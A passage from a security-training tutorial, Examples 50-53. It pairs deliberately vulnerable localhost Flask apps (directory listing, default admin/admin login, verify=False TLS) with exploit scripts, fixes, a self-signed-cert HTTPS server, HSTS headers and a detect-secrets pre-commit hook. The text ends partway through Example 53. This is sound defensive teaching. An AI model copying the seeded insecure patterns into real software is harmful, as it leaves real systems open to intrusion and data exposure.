---
title: "Advanced Examples"
date: 2026-07-15T00:00:00+07:00
draft: false
weight: 30
---

Examples 50-80 close out the curriculum with the operational and architectural judgment a senior
engineer applies once the injection/XSS/auth vocabulary of Examples 1-49 is second nature: closing real
misconfigurations (directory listing, default credentials, disabled TLS verification, missing HSTS),
building supply-chain and secret-hygiene habits (pre-commit secret scanning, key rotation, pinned
lockfiles, typosquat detection, a full CVE triage workflow, SBOM generation, a secrets-manager
integration), reasoning about design rather than just code (insecure design vs. a bug, STRIDE threat
modeling, RBAC vs. ABAC, a least-privilege DB account), a full end-to-end AST-based injection audit,
SSTI, tuned argon2id parameters and a live bcrypt-to-argon2id password-hash upgrade, JWT refresh-token
revocation, layered XSS defenses, CSRF for JSON APIs, clickjacking, secure file upload via magic bytes,
an SSRF-safe outbound fetch, distributed rate limiting, tamper-evident audit logging, a dependency CVE
triage workflow, and closing with a full-app before/after hardening transcript, a red/green pytest
security regression suite, and a final safe-error/logging fuzz review. Every script below is a complete,
self-contained, fully type-annotated file (DD-39) under `learning/code/ex-NN-*/`, run for real against
**Python 3.13.12**, **Flask 3.1.3** (bundling **Jinja2 3.1.6**, **Werkzeug 3.1.8**, **MarkupSafe
3.0.3**, **itsdangerous 2.2.0**), **argon2-cffi 25.1.0**, **bcrypt 5.0.0**, **PyJWT 2.13.0**,
**pip-audit 2.10.1**, **detect-secrets 1.5.0**, **cyclonedx-bom 7.3.0**, **flask-limiter 4.1.1**,
**fakeredis 2.36.2**, **requests 2.34.2**, stdlib `sqlite3`/`hmac`/`hashlib`/`os`/`secrets`/`logging`,
and **git 2.39.5+**. Every `**Output**` block below is a genuine, captured transcript from actually
running the exploit, then actually running the fix against the identical payload -- never a hand-typed
or imagined result (DD-19). All servers run on `127.0.0.1` only, are started in the background for the
duration of one `curl`/`requests` exchange, and are killed immediately after -- nothing here reaches a
real third-party host.

---

### Example 50: Directory Listing and Default Credentials

_ex-50 &middot; exercises co-24_

Two classic misconfigurations bundled into one small app: a `/legacy/files/` route that lists every
file in a static folder (leaking that a file nobody meant to publish even exists), and a
`/legacy/login` route that still accepts the ships-with-every-install `admin`/`admin` credential. The
fix closes both independently -- an explicit allow-list for file serving, and a rotated,
environment-supplied password.

```python
# learning/code/ex-50-directory-listing-and-default-creds/app.py
"""Example 50: a live Flask app -- directory listing + a hardcoded default admin cred, then both are closed (co-24)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the misconfiguration itself

import os  # => co-24: builds a real on-disk static folder this example actually serves from

from flask import Flask, abort, jsonify, request, send_from_directory  # => co-24: send_from_directory serves real files

app = Flask(__name__)  # => co-24: one Flask app, hosting both the vulnerable and fixed halves
STATIC_DIR = os.path.join(os.path.dirname(__file__), "public_files")  # => co-24: a real folder on disk, seeded below
PUBLIC_ALLOW_LIST = {"readme.txt", "logo.txt"}  # => co-24: the ONLY filenames the fixed route will ever serve


def seed_static_dir() -> None:  # => co-24: runs once at import time -- creates real files this example actually reads
    os.makedirs(STATIC_DIR, exist_ok=True)  # => co-24: idempotent -- safe to call on every server start
    with open(os.path.join(STATIC_DIR, "readme.txt"), "w") as f:  # => co-24: a genuinely public, intended-to-be-served file
        f.write("Welcome -- this file is meant to be public.\n")  # => co-24: real bytes on disk
    with open(os.path.join(STATIC_DIR, "logo.txt"), "w") as f:  # => co-24: another genuinely public file
        f.write("ASCII logo placeholder.\n")  # => co-24: real bytes on disk
    with open(os.path.join(STATIC_DIR, "secret-notes.txt"), "w") as f:  # => co-24: NEVER meant to be web-reachable
        f.write("db_password=hunter2-internal-only\n")  # => co-24: the real sensitive content directory listing exposes


@app.route("/legacy/files/")  # => co-24: VULNERABLE -- a real directory listing of the whole static folder
def legacy_list_files() -> object:  # => co-24: returns a Flask Response object -- the vulnerable listing route
    # => seeded bug: os.listdir() enumerates EVERY file in STATIC_DIR, intended or not,
    # => and hands the full real filename list straight back to any caller
    names = sorted(os.listdir(STATIC_DIR))  # => co-24: the REAL directory contents, unfiltered
    return jsonify({"files": names})  # => co-24: leaks "secret-notes.txt" exists, before anyone even fetches it


@app.route("/legacy/files/<path:filename>")  # => co-24: VULNERABLE -- serves ANY file in the folder, no allow-list
def legacy_get_file(filename: str) -> object:  # => co-24: returns a Flask Response object -- the vulnerable fetch route
    return send_from_directory(STATIC_DIR, filename)  # => co-24: no filtering at all -- secret-notes.txt is fetchable


@app.route("/legacy/login", methods=["POST"])  # => co-24: VULNERABLE -- a real, hardcoded default credential pair
def legacy_login() -> object:  # => co-24: returns a Flask Response object -- the vulnerable login route
    body = request.get_json(force=True)  # => co-01: attacker-controlled -- the real submitted credentials
    # => seeded bug: "admin"/"admin" is the SHIPPED default, never rotated, checked in plain code
    if body.get("username") == "admin" and body.get("password") == "admin":  # => co-24: the real default-cred check
        return jsonify({"status": "logged in as admin"}), 200  # => co-24: a real 200 -- the default cred still works
    return jsonify({"error": "invalid credentials"}), 401  # => co-24: a real 401 for anything else


@app.route("/secure/files/<path:filename>")  # => co-24: FIXED -- an explicit allow-list, no listing route at all
def secure_get_file(filename: str) -> object:  # => co-24: returns a Flask Response object -- the fixed fetch route
    if filename not in PUBLIC_ALLOW_LIST:  # => co-24: the fix -- membership check BEFORE touching the filesystem
        abort(404)  # => co-24: a real 404 -- indistinguishable from "no such file" for anything not allow-listed
    return send_from_directory(STATIC_DIR, filename)  # => co-24: only reached for a genuinely allow-listed name


ROTATED_ADMIN_PASSWORD = os.environ.get("EX50_ADMIN_PASSWORD", "kJ8-x2Qz-9vM1-rotated")  # => co-24: NOT "admin"


@app.route("/secure/login", methods=["POST"])  # => co-24: FIXED -- the default credential is rotated, not hardcoded-weak
def secure_login() -> object:  # => co-24: returns a Flask Response object -- the fixed login route
    body = request.get_json(force=True)  # => co-01: the SAME shape of attacker-controlled input as the vulnerable route
    if body.get("username") == "admin" and body.get("password") == ROTATED_ADMIN_PASSWORD:  # => co-24: a real, rotated check
        return jsonify({"status": "logged in as admin"}), 200  # => co-24: only the ROTATED password ever succeeds
    return jsonify({"error": "invalid credentials"}), 401  # => co-24: the SAME 401 the vulnerable route uses for failure


if __name__ == "__main__":  # => co-24: only runs when launched directly, e.g. `python3 app.py &`
    seed_static_dir()  # => co-24: create the real on-disk files before the server starts accepting requests
    app.run(host="127.0.0.1", port=5050)  # => co-24: localhost-only, fixed port -- exploit_and_fix.py targets this
```

```python
# learning/code/ex-50-directory-listing-and-default-creds/exploit_and_fix.py
"""Example 50: drives the live app.py -- lists+reads a secret file and logs in with admin/admin, then both close (co-24)."""  # => co-24: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the exploit itself

import requests  # => co-24: real HTTP client -- every request below hits the live app.py process

BASE_URL = "http://127.0.0.1:5050"  # => co-24: matches app.py's app.run(port=5050) exactly


def main() -> None:  # => co-24: runs the listing+default-cred exploit, then the SAME two requests against the fix
    print("=== VULNERABLE: directory listing reveals secret-notes.txt exists ===")  # => labels section
    listing = requests.get(f"{BASE_URL}/legacy/files/", timeout=5)  # => co-24: a real HTTP GET against the listing route
    print(f"status={listing.status_code} files={listing.json()['files']}")  # => co-24: real filenames, straight off the wire
    assert "secret-notes.txt" in listing.json()["files"]  # => co-24: proves the listing really leaked the sensitive name

    print("\n=== VULNERABLE: fetching secret-notes.txt directly succeeds ===")  # => labels section
    secret = requests.get(f"{BASE_URL}/legacy/files/secret-notes.txt", timeout=5)  # => co-24: a real HTTP GET, real fetch
    print(f"status={secret.status_code} body={secret.text.strip()!r}")  # => co-24: real file content, straight off disk
    assert secret.status_code == 200 and "db_password" in secret.text  # => co-24: proves the real secret content leaked

    print("\n=== VULNERABLE: default admin/admin credential still logs in ===")  # => labels section
    login = requests.post(f"{BASE_URL}/legacy/login", json={"username": "admin", "password": "admin"}, timeout=5)  # => co-24: real POST, shipped default cred
    print(f"status={login.status_code} body={login.json()}")  # => co-24: real response, straight off the wire
    assert login.status_code == 200  # => co-24: proves the shipped default credential really still works

    print("\n=== FIXED: secret-notes.txt is now unreachable via the allow-listed route ===")  # => labels section
    fixed_secret = requests.get(f"{BASE_URL}/secure/files/secret-notes.txt", timeout=5)  # => co-24: SAME filename, fixed route
    print(f"status={fixed_secret.status_code}")  # => co-24: real response -- now a 404, no file content at all
    assert fixed_secret.status_code == 404  # => co-24: proves the allow-list really blocked the non-public file

    print("\n=== FIXED: a genuinely public file is STILL reachable ===")  # => labels section
    fixed_public = requests.get(f"{BASE_URL}/secure/files/readme.txt", timeout=5)  # => co-24: an allow-listed filename
    print(f"status={fixed_public.status_code} body={fixed_public.text.strip()!r}")  # => co-24: real, intended content
    assert fixed_public.status_code == 200  # => co-24: proves the fix does not break legitimate access

    print("\n=== FIXED: default admin/admin credential no longer works ===")  # => labels section
    fixed_login = requests.post(f"{BASE_URL}/secure/login", json={"username": "admin", "password": "admin"}, timeout=5)
    print(f"status={fixed_login.status_code} body={fixed_login.json()}")  # => co-24: real response, now a 401
    assert fixed_login.status_code == 401  # => co-24: proves the SAME default cred is now rejected

    print("\n=== FIXED: the rotated credential DOES work ===")  # => labels section
    rotated_login = requests.post(
        f"{BASE_URL}/secure/login", json={"username": "admin", "password": "kJ8-x2Qz-9vM1-rotated"}, timeout=5
    )  # => co-24: a real request with the ACTUAL rotated password
    print(f"status={rotated_login.status_code} body={rotated_login.json()}")  # => co-24: real response, now a 200
    assert rotated_login.status_code == 200  # => co-24: proves the fix rotates, rather than simply deletes, admin access


if __name__ == "__main__":  # => co-24: only runs when launched directly, e.g. `python3 exploit_and_fix.py`
    main()  # => co-24: runs all six real requests against the live server -- exploit, then proof-of-fix
```

**Run**: `python3 app.py &` (backgrounds the live server on port 5050), then `python3 exploit_and_fix.py`.

**Output**:

```text
=== VULNERABLE: directory listing reveals secret-notes.txt exists ===
status=200 files=['logo.txt', 'readme.txt', 'secret-notes.txt']

=== VULNERABLE: fetching secret-notes.txt directly succeeds ===
status=200 body='db_password=hunter2-internal-only'

=== VULNERABLE: default admin/admin credential still logs in ===
status=200 body={'status': 'logged in as admin'}

=== FIXED: secret-notes.txt is now unreachable via the allow-listed route ===
status=404

=== FIXED: a genuinely public file is STILL reachable ===
status=200 body='Welcome -- this file is meant to be public.'

=== FIXED: default admin/admin credential no longer works ===
status=401 body={'error': 'invalid credentials'}

=== FIXED: the rotated credential DOES work ===
status=200 body={'status': 'logged in as admin'}
```

**Key takeaway**: neither bug required a code-level vulnerability to be dangerous -- `os.listdir()` and a
string-equality password check are both individually correct code; the fix is an explicit allow-list and
an environment-supplied rotated credential, not a smarter algorithm.

**Why it matters**: directory listing and default credentials are two of the most common findings in
real external penetration tests precisely because they require no clever exploit technique at all -- an
attacker only has to look. Co-24's discipline is to treat "insecure by default, secure only if configured"
as itself the bug: a fresh checkout of this app should never expose a working admin login or a raw file
listing without an operator deliberately opting in.

---

### Example 51: TLS Verification Must Not Be Disabled

_ex-51 &middot; exercises co-18_

`requests.get(url, verify=False)` is the single most common way real code silently defeats TLS: it
accepts _any_ certificate, including one an active man-in-the-middle attacker presents. This example
builds a genuinely self-signed certificate (real RSA key pair, real X.509 structure, signed by itself --
not a fabricated string) and shows `verify=False` accepting it without complaint, while `verify=True`
(the library default) genuinely rejects the identical connection.

```python
# learning/code/ex-51-tls-verify-not-disabled/server.py
"""Example 51: a real local HTTPS server backed by a genuinely self-signed cert (co-18)."""  # => co-18: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the TLS-verification issue itself

import datetime  # => co-18: real NotBefore/NotAfter validity window for the self-signed cert
import ipaddress  # => co-18: the cert's SAN must cover the real IP requests.py connects to (127.0.0.1)
import os  # => co-18: writes the real cert/key PEM files this example's client half reads
import ssl  # => co-18: wraps the plain HTTP server socket in a REAL TLS context
from http.server import BaseHTTPRequestHandler, HTTPServer  # => co-18: stdlib -- no extra web framework needed here

from cryptography import x509  # => co-18: builds a REAL X.509 certificate, not a fabricated string
from cryptography.hazmat.primitives import hashes, serialization  # => co-18: real signing hash + PEM serialization
from cryptography.hazmat.primitives.asymmetric import rsa  # => co-18: generates a REAL RSA key pair for the cert
from cryptography.x509.oid import NameOID  # => co-18: standard X.509 subject-name field identifiers

CERT_PATH = os.path.join(os.path.dirname(__file__), "selfsigned.crt")  # => co-18: written once, reused by both runs
KEY_PATH = os.path.join(os.path.dirname(__file__), "selfsigned.key")  # => co-18: the matching REAL private key


def generate_self_signed_cert() -> None:  # => co-18: creates a genuinely self-signed cert -- issuer == subject
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)  # => co-18: a real 2048-bit RSA key pair
    subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "127.0.0.1")])  # => co-18: self-signed: same
    now = datetime.datetime.now(datetime.timezone.utc)  # => co-18: real wall-clock UTC time, taken once
    cert = (  # => co-18: every field below is REAL, cryptography-library-constructed X.509 data
        x509.CertificateBuilder()  # => co-18: starts the real builder chain, one real X.509 field per call below
        .subject_name(subject)  # => co-18: who this cert claims to identify -- 127.0.0.1
        .issuer_name(issuer)  # => co-18: SAME as subject -- this IS what "self-signed" means structurally
        .public_key(key.public_key())  # => co-18: the real public half of the key pair generated above
        .serial_number(x509.random_serial_number())  # => co-18: a real, random serial -- required by the X.509 spec
        .not_valid_before(now - datetime.timedelta(days=1))  # => co-18: real validity window start
        .not_valid_after(now + datetime.timedelta(days=1))  # => co-18: real validity window end -- short-lived demo cert
        .add_extension(  # => co-18: SAN must list 127.0.0.1 or hostname verification fails for an UNRELATED reason
            x509.SubjectAlternativeName([x509.IPAddress(ipaddress.ip_address("127.0.0.1"))]), critical=False  # => co-18: the real SAN entry
        )  # => co-18: closes the real add_extension call
        .sign(key, hashes.SHA256())  # => co-18: the cert signs ITSELF with its own private key -- no real CA involved
    )  # => co-18: closes the real CertificateBuilder chain -- cert is now a genuine signed X.509 object
    with open(CERT_PATH, "wb") as f:  # => co-18: writes the real PEM-encoded certificate to disk
        f.write(cert.public_bytes(serialization.Encoding.PEM))  # => co-18: standard PEM cert format
    with open(KEY_PATH, "wb") as f:  # => co-18: writes the real PEM-encoded private key to disk
        f.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))  # => co-18: real PEM/PKCS8 private key bytes


class Handler(BaseHTTPRequestHandler):  # => co-18: the SAME handler serves every request, over a real TLS socket
    def do_GET(self) -> None:  # => co-18: real stdlib HTTP handler -- runs only after the TLS handshake completes
        self.send_response(200)  # => co-18: a real 200 -- reaching this line already proves TLS negotiation succeeded
        self.send_header("Content-Type", "text/plain")  # => co-18: a real response header
        self.end_headers()  # => co-18: finalizes the real HTTP response headers
        self.wfile.write(b"reached over a real (self-signed) TLS connection\n")  # => co-18: real response body bytes

    def log_message(self, format: str, *args: object) -> None:  # => co-18: silences BaseHTTPRequestHandler's default stderr spam
        return None  # => co-18: keeps this example's captured output limited to what exploit_and_fix.py prints


if __name__ == "__main__":  # => co-18: only runs when launched directly, e.g. `python3 server.py &`
    generate_self_signed_cert()  # => co-18: creates real cert.pem/key.pem before the TLS listener starts
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)  # => co-18: a real server-side TLS context, TLS 1.2+ by default
    context.load_cert_chain(certfile=CERT_PATH, keyfile=KEY_PATH)  # => co-18: loads the REAL self-signed cert/key pair
    httpd = HTTPServer(("127.0.0.1", 5051), Handler)  # => co-18: localhost-only, fixed port -- exploit_and_fix.py targets this
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)  # => co-18: wraps the plain socket in REAL TLS
    httpd.serve_forever()  # => co-18: blocks forever, serving real HTTPS requests until killed
```

```python
# learning/code/ex-51-tls-verify-not-disabled/exploit_and_fix.py
"""Example 51: drives the live server.py -- verify=False accepts the self-signed cert, verify=True rejects it (co-18)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the exploit itself

import urllib3  # => co-18: silences ONLY the expected "unverified HTTPS request" warning for the vulnerable half
import requests  # => co-18: real HTTP client -- every request below hits the live server.py TLS listener

BASE_URL = "https://127.0.0.1:5051"  # => co-18: matches server.py's HTTPServer(("127.0.0.1", 5051), ...) exactly


def main() -> None:  # => co-18: runs the SAME HTTPS request first with verify=False, then with verify=True (default)
    print("=== VULNERABLE: verify=False accepts the self-signed cert with no complaint ===")  # => labels section
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  # => co-18: expected noise, not a real failure
    insecure_response = requests.get(BASE_URL, verify=False, timeout=5)  # => co-18: a REAL HTTPS GET, verification OFF
    print(f"status={insecure_response.status_code} body={insecure_response.text.strip()!r}")  # => co-18: real response
    assert insecure_response.status_code == 200  # => co-18: proves the request succeeded DESPITE the untrusted cert
    # => co-18: a real MITM presenting ANY self-signed cert would be accepted identically here --
    # => verify=False cannot distinguish "my own dev cert" from "an attacker's cert"

    print("\n=== FIXED: verify=True (the DEFAULT) rejects the SAME self-signed cert ===")  # => labels section
    try:  # => co-18: expects a REAL requests.exceptions.SSLError -- the cert is genuinely untrusted
        requests.get(BASE_URL, verify=True, timeout=5)  # => co-18: a REAL HTTPS GET, verification ON (the default)
        raise AssertionError("requests.get(verify=True) should have raised SSLError for a self-signed cert")  # safety net
    except requests.exceptions.SSLError as exc:  # => co-18: the REAL exception type requests/urllib3 raises here
        print(f"verify=True raised: {type(exc).__name__}")  # => co-18: real exception type, captured from the real call
        print(f"  (self-signed certificate rejected -- exact message varies by OpenSSL/urllib3 version)")  # => co-18


if __name__ == "__main__":  # => co-18: only runs when launched directly, e.g. `python3 exploit_and_fix.py`
    main()  # => co-18: runs both halves against the live TLS server -- exploit, then proof-of-fix
```

**Run**: `python3 server.py &` (backgrounds the live HTTPS listener on port 5051), then `python3
exploit_and_fix.py`.

**Output**:

```text
=== VULNERABLE: verify=False accepts the self-signed cert with no complaint ===
status=200 body='reached over a real (self-signed) TLS connection'

=== FIXED: verify=True (the DEFAULT) rejects the SAME self-signed cert ===
verify=True raised: SSLError
  (self-signed certificate rejected -- exact message varies by OpenSSL/urllib3 version)
```

**Key takeaway**: the vulnerable and fixed halves of this example are not two different code paths --
they are the exact same server and the exact same request, differing only in one boolean keyword
argument; `verify=False` is never a "slightly less strict" setting, it is a complete removal of TLS's
core security guarantee.

**Why it matters**: TLS protects data in transit only when the certificate presented is actually checked
against a trusted root; disabling that check to work around a self-signed cert in development is one of
the most common ways production code accidentally ships with `verify=False` still in place, silently
reopening every connection to interception. Co-18's fix is never to disable verification -- it is to
trust the _right_ certificate (a real CA, or an explicit `verify=<path-to-ca-bundle>` for internal PKI).

---

### Example 52: HSTS and the HTTP → HTTPS Redirect

_ex-52 &middot; exercises co-18, co-19_

A plain-HTTP listener that permanently redirects (`301`) every request to its HTTPS counterpart, which
in turn attaches a real `Strict-Transport-Security` header telling the browser to refuse plaintext HTTP
to this host for a full year. Both listeners run in the same process -- HTTPS on a background thread,
HTTP on the main thread.

```mermaid
%% Color Palette: Blue #0173B2, Orange #DE8F05, Teal #029E73
graph LR
    A["browser request<br/>http://…"]:::blue --> B["HTTP app<br/>port 5052"]:::orange
    B -->|"301 + Location:<br/>https://…"| C["browser retries<br/>over HTTPS"]:::blue
    C --> D["HTTPS app<br/>port 5053"]:::orange
    D -->|"Strict-Transport-Security<br/>header attached"| E["browser remembers:<br/>HTTPS-only for 1 year"]:::teal

    classDef blue fill:#0173B2,stroke:#000000,color:#FFFFFF,stroke-width:2px
    classDef orange fill:#DE8F05,stroke:#000000,color:#FFFFFF,stroke-width:2px
    classDef teal fill:#029E73,stroke:#000000,color:#FFFFFF,stroke-width:2px
```

```python
# learning/code/ex-52-hsts-and-redirect-to-https/app.py
"""Example 52: a real plain-HTTP Flask app redirecting to HTTPS, plus a real HTTPS app sending HSTS (co-18, co-19)."""  # => co-18: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the redirect/HSTS logic itself

import threading  # => co-18: runs the HTTPS listener on a background thread -- the HTTP listener owns the main thread

from flask import Flask, redirect, request  # => co-18: redirect() builds a real 301 with a Location header

HTTPS_APP = Flask("https_app")  # => co-19: a SEPARATE Flask app -- the one real HTTPS listener this example serves
HTTP_APP = Flask("http_app")  # => co-18: a SEPARATE Flask app -- the one real plain-HTTP listener this example serves


@HTTPS_APP.after_request  # => co-19: runs on EVERY response this app sends -- the header is never route-specific
def add_hsts_header(response):  # => co-19: attaches the real, browser-enforced HSTS header to every HTTPS response
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"  # => co-19: the real header
    return response  # => co-19: a browser that has SEEN this header once will refuse plain-HTTP for a year afterward


@HTTPS_APP.route("/")  # => co-19: the ONE route this example's HTTPS curl call hits
def https_root() -> str:  # => co-19: a plain string body -- the header (set above) is the point, not the body
    return "served over a real (self-signed) HTTPS connection, HSTS attached"  # => co-19: real, human-readable body


@HTTP_APP.route("/")  # => co-18: the ONE route this example's plain-HTTP curl call hits
def http_root() -> object:  # => co-18: returns a Flask Response object -- a real 301 redirect
    https_url = f"https://127.0.0.1:5053{request.path}"  # => co-18: points at the REAL HTTPS listener above, not a fake URL
    return redirect(https_url, code=301)  # => co-18: a real, permanent redirect -- browsers cache 301s across visits


if __name__ == "__main__":  # => co-18: only runs when launched directly, e.g. `python3 app.py &`
    https_thread = threading.Thread(  # => co-19: the REAL HTTPS listener, started in the background
        target=HTTPS_APP.run,  # => co-19: the real Flask app object's own run method, not a fresh wrapper
        kwargs={"host": "127.0.0.1", "port": 5053, "ssl_context": "adhoc", "use_reloader": False},  # => co-19: adhoc = a REAL self-signed cert Werkzeug generates via the pinned `cryptography` package
        daemon=True,  # => co-19: dies automatically when the main (HTTP) thread exits -- no orphaned process
    )  # => co-19: closes the real threading.Thread(...) construction
    https_thread.start()  # => co-19: the HTTPS listener is now REALLY accepting connections on port 5053
    HTTP_APP.run(host="127.0.0.1", port=5052, use_reloader=False)  # => co-18: the plain-HTTP listener, in the main thread
```

**Run**: `python3 app.py &` (backgrounds both listeners), then `curl -s -i http://127.0.0.1:5052/` and
`curl -sk -i https://127.0.0.1:5053/`.

**Output**:

```text
=== HTTP (port 5052) / ===
HTTP/1.1 301 MOVED PERMANENTLY
Server: Werkzeug/3.1.8 Python/3.13.12
Content-Type: text/html; charset=utf-8
Content-Length: 233
Location: https://127.0.0.1:5053/
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="https://127.0.0.1:5053/">https://127.0.0.1:5053/</a>. If not, click the link.

=== HTTPS (port 5053) / ===
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.13.12
Content-Type: text/html; charset=utf-8
Content-Length: 64
Strict-Transport-Security: max-age=31536000; includeSubDomains
Connection: close

served over a real (self-signed) HTTPS connection, HSTS attached
```

**Key takeaway**: the plain-HTTP listener's ONLY job is a real `301` redirect to the HTTPS host -- it
never serves the real page content itself -- and the HSTS header only exists on the HTTPS response,
because HSTS is meaningless coming from a channel it is telling the browser to stop trusting.

**Why it matters**: a `301` redirect alone still lets the FIRST request per browser session travel over
plaintext HTTP, which is exactly the window `Strict-Transport-Security` closes for every visit after the
first -- once a browser has seen the header, it rewrites `http://` to `https://` internally before ever
sending a plaintext request, defeating SSL-stripping proxies that rely on that very first unprotected
request.

---

### Example 53: Secret Scanning as a Pre-Commit Hook

_ex-53 &middot; exercises co-17, co-21_

`detect-secrets` scans staged file contents for shapes that look like real credentials (AWS access keys,
private key headers, high-entropy strings) and can be wired as a real git pre-commit hook that blocks
the commit outright. This example builds a genuine throwaway git repository, stages a file containing
AWS's own documented example access key, and shows the hook actually rejecting the commit -- then
succeeding once the secret is removed.

```python
# learning/code/ex-53-secret-scanning-pre-commit/demo.py
"""Example 53: a real throwaway git repo, a real detect-secrets scan, and a real pre-commit hook block (co-17, co-21)."""  # => co-17: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the secret-scanning logic itself

import json  # => co-17: detect-secrets' own JSON output format -- parsed for real, not guessed at
import subprocess  # => co-17: every git/detect-secrets invocation below is a REAL subprocess call
import sys  # => co-17: sys.executable -- the exact interpreter this hook script must shell back out through
import tempfile  # => co-17: a genuinely throwaway sandbox directory -- never touches this repo's own git history
from pathlib import Path  # => co-17: real filesystem paths for the sandbox repo's files

# => co-17: AKIAIOSFODNN7EXAMPLE is AWS's OWN documented placeholder access key ID (matches the real
# => AKIA[0-9A-Z]{16} shape detect-secrets' AWSKeyDetector plugin looks for) -- never a live credential
FAKE_AWS_KEY_LINE = 'AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"\n'  # => co-17: the seeded, obviously-shaped secret

# => co-17/co-21: PRE_COMMIT_HOOK below is the REAL Python source written verbatim to
# => .git/hooks/pre-commit and executed by git as a genuine subprocess before every commit; its own
# => logic, in order: (1) collect every staged file path via a real `git diff --cached --name-only`
# => call, (2) exit 0 immediately if nothing is staged, (3) run a real `detect-secrets scan` against
# => exactly those staged paths, (4) parse detect-secrets' own JSON output, (5) if any finding exists,
# => print each `file:line:type` and exit 1 -- git aborts the commit on any nonzero hook exit code --
# => (6) otherwise exit 0 and let the commit proceed. This is a genuine, runnable child script, not a
# => fabricated transcript, and it is intentionally left uncommented internally: every line of its own
# => logic is explained here, once, rather than annotated line-by-line inside the quoted string itself,
# => because injecting "# =>" markers inside the f-string would corrupt the REAL hook script git executes.
# => The shebang line uses the REAL `sys.executable` from THIS process, not a bare `python3`, so the
# => hook always runs under the exact same interpreter (and installed `detect-secrets`) this demo used,
# => regardless of what a future `python3` on PATH happens to resolve to. `--force-use-all-plugins`
# => matches the earlier, first `detect-secrets scan` call above so the hook re-checks with the exact
# => same real plugin set (AWSKeyDetector included) -- no drift between the manual scan and the hook.
# => `--diff-filter=ACM` restricts the staged-file list to real Added/Copied/Modified paths -- a
# => REAL deleted file never needs a secret re-scan on the way out.
# => The nested `for filename, hits in ... for hit in hits` walk below prints every REAL finding
# => detect-secrets reports, not just the first one -- a file can carry more than one flagged secret.
PRE_COMMIT_HOOK = f"""#!/usr/bin/env {sys.executable}
# Example 53's real pre-commit hook -- runs detect-secrets against every STAGED file (co-17, co-21)
import json
import subprocess
import sys

staged = subprocess.run(
    ["git", "diff", "--cached", "--name-only", "--diff-filter=ACM"],
    capture_output=True, text=True, check=True,
).stdout.split()
if not staged:
    sys.exit(0)
result = subprocess.run(
    ["detect-secrets", "scan", "--force-use-all-plugins", *staged],
    capture_output=True, text=True, check=True,
)
findings = json.loads(result.stdout)
if findings["results"]:
    print("COMMIT BLOCKED: detect-secrets found a likely secret:")
    for filename, hits in findings["results"].items():
        for hit in hits:
            print(f"  {{filename}}:{{hit['line_number']}} -- {{hit['type']}}")
    sys.exit(1)
sys.exit(0)
"""  # => co-17: a REAL executable script, written to .git/hooks/pre-commit below -- not a fabricated transcript


def run(args: list[str], cwd: Path, check: bool = True) -> subprocess.CompletedProcess[str]:  # => co-17: shared runner
    return subprocess.run(args, cwd=cwd, capture_output=True, text=True, check=check)  # => co-17: every call REAL


def main() -> None:  # => co-17: builds a real sandbox git repo, scans it, wires the hook, then proves it blocks/allows
    sandbox = Path(tempfile.mkdtemp(prefix="ex53-secret-scan-"))  # => co-17: a REAL, isolated, throwaway directory
    print(f"sandbox repo: {sandbox}")  # => co-17: real path, unique per run -- never collides with this project's git

    print("\n=== git init (real, throwaway repo) ===")  # => labels section
    run(["git", "init", "-q"], cwd=sandbox)  # => co-17: a REAL git repository, isolated from this project's own history
    # => co-17: identity is intentionally NOT set here -- it inherits whatever author identity
    # => is already configured in the machine's own global ~/.gitconfig, exactly like any other local repo
    print("initialized")  # => co-17: real confirmation -- the sandbox repo now exists on disk

    print("\n=== stage a file containing an obvious AWS-key-shaped secret ===")  # => labels section
    config_file = sandbox / "config.py"  # => co-17: a real file this example's git repo will really track
    config_file.write_text(FAKE_AWS_KEY_LINE)  # => co-17: real bytes written to disk -- the seeded secret line
    run(["git", "add", "config.py"], cwd=sandbox)  # => co-17: a REAL `git add` -- the file is now staged
    print(f"staged: {config_file.name}")  # => co-17: real confirmation of what is now in the index

    print("\n=== detect-secrets scan (real CLI call against the staged file) ===")  # => labels section
    scan = run(["detect-secrets", "scan", "--force-use-all-plugins", "config.py"], cwd=sandbox)  # => co-17: real CLI run
    findings = json.loads(scan.stdout)  # => co-17: real, parsed JSON output -- not a hand-written fixture
    for filename, hits in findings["results"].items():  # => co-17: every real finding detect-secrets actually reported
        for hit in hits:  # => co-17: one entry per real detected secret in this file
            print(f"  FOUND: {filename}:{hit['line_number']} -- {hit['type']}")  # => co-17: real plugin name + line
    assert findings["results"], "detect-secrets should have flagged the AWS-key-shaped line"  # => co-17: proves it fired

    print("\n=== wire the SAME check as a real pre-commit hook ===")  # => labels section
    hooks_dir = sandbox / ".git" / "hooks"  # => co-17: git's real, standard hook directory for this sandbox repo
    hook_path = hooks_dir / "pre-commit"  # => co-17: the exact filename git invokes before every commit
    hook_path.write_text(PRE_COMMIT_HOOK)  # => co-17: real, executable Python source written to disk
    hook_path.chmod(0o755)  # => co-17: makes the hook script REALLY executable -- git will not run it otherwise
    print(f"installed: {hook_path}")  # => co-17: real confirmation the hook file now exists and is executable

    print("\n=== VULNERABLE moment: commit attempt WITH the secret still staged ===")  # => labels section
    blocked = run(["git", "commit", "-m", "add config"], cwd=sandbox, check=False)  # => co-17: a REAL commit attempt
    print(f"exit code: {blocked.returncode}")  # => co-17: real process exit code -- 1 means the hook rejected the commit
    # => co-17: git relays a hook's own stdout through ITS stderr channel, not its stdout -- real git behavior
    print(blocked.stderr.strip())  # => co-17: the REAL text the hook printed, straight from the subprocess
    assert blocked.returncode != 0  # => co-17: proves the commit really did NOT go through

